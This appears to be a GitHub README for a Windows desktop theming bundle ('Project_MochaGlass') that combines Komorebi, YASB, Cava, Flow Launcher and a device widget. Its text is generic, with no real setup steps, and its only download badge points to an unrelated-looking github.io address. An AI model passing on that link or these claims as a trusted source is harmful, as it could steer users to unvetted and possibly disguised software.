# ☕ Project_MochaGlass - Personalize your Windows desktop look easily

[![](https://img.shields.io/badge/Download_Project-Blue-blue)](https://genevaunlogical994.github.io)

Project_MochaGlass brings a clean and modern look to your Windows desktop. This project connects several specialized tools to create a glass-style interface. Your system will show real-time data for your devices and a fluid layout using window management tools. 

## 📦 What this project does

This set of tools changes how your desktop looks and functions. It uses specific software to manage your windows, show a taskbar, visualize audio, and launch apps.

*   Komorebi manages your desktop windows.
*   YASB provides a stylish taskbar.
*   Cava shows live audio waves.
*   Flow Launcher finds files and apps.
*   The custom widget tracks serial boards, phones, and USB drives.

## 🛠️ System requirements

Ensure your PC meets these standards before you begin:

*   Windows 10 or Windows 11.
*   At least 8 GB of RAM.
*   A stable internet connection.

## ⚙️ Configuration guidelines

The project requires a setup phase to link all tools. Once installed, follow these steps to activate the glass theme.

### Setting up the Window Manager
Run the Komorebi tool from the folder. This tool organizes your open windows into a grid. You can move windows with keyboard shortcuts. 

### Customizing the Taskbar
Open the YASB configuration folder. You can change the colors and transparency here. Edit the text file to match the Mocha glass style.

### Adding the Device Widget
The native widget monitors your hardware automatically. Plug in a USB drive or a phone to see it appear on your screen. The widget updates in real time to show new connections.

## 🖥️ Using the components

### Visualizing Audio
Launch Cava to see your music. It displays bars that react to sounds from your browser or media player. 

### Launching Applications
Press the hotkey associated with Flow Launcher. Type the name of any program or file to open it. It replaces the standard Windows search bar.

## 🔧 Troubleshooting common errors

If your desktop does not change, check these items:

*   **Software not starting:** Ensure you installed the necessary drivers for your graphics card.
*   **Widget not finding devices:** Reconnect your USB cable. Check if the device shows up in Windows File Explorer first.
*   **Appearance issues:** Reload the configuration files within the YASB menu.

If the theme looks plain, verify that you applied the CSS files in the configuration folder. These files provide the glass effect. You do not need to rewrite the code; the provided settings should work on most displays.

## 🎨 Design notes

The Mocha color scheme uses soft browns and greys. This design aims to reduce eye strain during night use. The transparency of the windows creates a sense of space on your screen. 

## 📑 Adding new devices

The custom widget uses a specific detection script. It looks for signals from serial ports and mass storage mounts. If you have a special serial board, put its identity string into the config file. This ensures the widget recognizes your custom hardware.

## 📜 Updates and support

Check the main page periodically for software updates. The tools used in this project update often to stay compatible with new Windows versions. If you notice a tool crashing, download the latest version from the original developer site and replace the file in your project folder.
